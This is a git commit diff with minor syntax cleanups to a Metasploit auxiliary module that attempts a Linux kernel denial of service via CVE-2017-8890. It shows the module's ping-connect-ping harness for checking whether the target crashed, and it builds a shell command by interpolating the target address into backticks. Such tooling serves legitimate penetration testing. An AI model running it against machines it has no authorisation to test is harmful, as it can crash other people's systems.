caafbaae33709cbc7c2ac3a33ab06ab47c93c494
7043mcgeep <patrick.j.mcgee@marquette.edu>
2019-05-23 23:41:52 -0500

    Syntax changes

--- modules/auxiliary/dos/linux/mcast_dfree.rb
+++ modules/auxiliary/dos/linux/mcast_dfree.rb
@@ -6,6 +6,7 @@ require 'socket'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
+  #include Msf::Exploit::Remote::Ipv6
 
   def initialize(info = {})
     super( update_info( info,
@@ -29,8 +30,6 @@ class MetasploitModule < Msf::Auxiliary
         [
           ['BID', '98562'],
           ['CVE', '2017-8890'],
-          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2017-8890'],
-          ['URL', 'https://www.rapid7.com/db/vulnerabilities/debian-cve-2017-8890'],
           ['URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/ipv4/inet_connection_sock.c?h=v4.10#n668'],
           ['URL', 'https://thinkycx.me/posts/2018-10-30-a-glance-at-CVE-2017-8890.html'],
           ['URL', 'https://github.com/torvalds/linux/commit/657831ffc38e30092a2d5f03d385d710eb88b09a']
@@ -47,52 +46,51 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # Simply ping the target machine
-  def ping_exec(addr, port, status)
+  def ping_exec(addr, status)
     print_status("Pinging the target machine at #{addr}")
     reply = `ping -c 1 #{addr}` # Ping runs only once
-    if (reply.include? "1 packets transmitted, 1 received") && (status == "pre-connect")
-      print_good("Target machine is running.")
-    elsif (reply.include? "1 packets transmitted, 1 received") && (status == "post-connect")
-      print_error("Target machine responsive. DoS failed.")
+    if (reply.include? '1 packets transmitted, 1 received') && (status == 'pre-connect')
+      print_good('Target machine is running.')
+    elsif (reply.include? '1 packets transmitted, 1 received') && (status == 'post-connect')
+      print_error('Target machine responsive. DoS failed.')
       return
-    elsif status == "post-connect"
-      print_good("No reply from target machine post-connection.")
+    elsif status == 'post-connect'
+      print_good('No reply from target machine post-connection.')
     else
-      print_error("No reply from target machine. Make sure it is reachable.")
+      print_error('No reply from target machine. Make sure it is reachable.')
       return
     end
   end
 
   def run
-    addr = datastore['RHOST']
-    port = datastore['RPORT']
-
-    ping_exec(addr, port, "pre-connect")
+    ping_exec(rhost, 'pre-connect')
+    #ping6(datastore['SHOST']) # built-in IPV6 ping function
 
     begin
       connect	 # Connect using TCP mixin
-      print_good("Connection successfuly established with #{addr}:#{port}")
+      print_good("Connection successfuly established with #{rhost}:#{rport}")
       disconnect # Disconnect right away since kernel panic already triggered
     rescue Rex::ConnectionRefused
-      print_error("Failed to connect to #{addr}:#{port}. Connection refused. Make sure target is listening.")
+      print_error("Failed to connect to #{rhost}:#{rport}. Connection refused. Make sure target is listening.")
       return
     rescue Rex::HostUnreachable
-      print_error("Failed to connect to #{addr}:#{port}. Host unreachable.")
+      print_error("Failed to connect to #{rhost}:#{rport}. Host unreachable.")
       return
     rescue Rex::AddressInUse
-      print_error("Failed to connect to #{addr}:#{port}. Address in use.")
+      print_error("Failed to connect to #{rhost}:#{rport}. Address in use.")
       return
     rescue ::Errno::ETIMEDOUT
-      print_error("Failed to connect to #{addr}:#{port}. Timeout time exceeded.")
+      print_error("Failed to connect to #{rhost}:#{rport}. Timeout time exceeded.")
       return
     rescue Rex::ConnectionTimeout
-      print_error("Failed to connect to #{addr}:#{port}. The connection timed out.")
+      print_error("Failed to connect to #{rhost}:#{rport}. The connection timed out.")
       return
     end
 
     print_status("Waiting for #{datastore['WAIT_DOS']} seconds...")
     Rex.sleep(datastore['WAIT_DOS'])
 
-    ping_exec(addr, port, "post-connect") # No reply if kernel panicked
+    ping_exec(rhost, 'post-connect') # No reply if kernel panicked
+    #ping6(datastore['SHOST']) # built-in IPV6 ping function
   end
 end
